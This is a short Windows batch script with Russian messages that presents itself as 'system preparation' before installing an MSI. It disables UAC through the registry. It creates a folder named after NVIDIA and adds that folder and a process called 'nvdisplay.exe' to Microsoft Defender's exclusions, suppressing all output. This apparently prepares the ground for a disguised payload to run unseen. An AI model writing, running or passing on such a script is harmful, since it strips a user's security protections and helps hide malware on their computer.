@echo off
title Подготовка системы
color 0A
echo =========================================
echo   Подготовка системы для установки
echo =========================================
echo.

:: 1. Отключаем UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul
echo [1/4] UAC отключён (требуется перезагрузка)

:: 2. Создаём папку для установки (если её нет)
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul
echo [2/4] Папка создана

:: 3. Добавляем папку в исключения Defender
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
echo [3/4] Папка добавлена в исключения

:: 4. Добавляем процесс в исключения Defender (имя файла, который появится)
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1
echo [4/4] Процесс добавлен в исключения

echo.
echo Подготовка завершена. Теперь можно устанавливать MSI.
echo После установки MSI программа будет скопирована и готова к запуску.
pause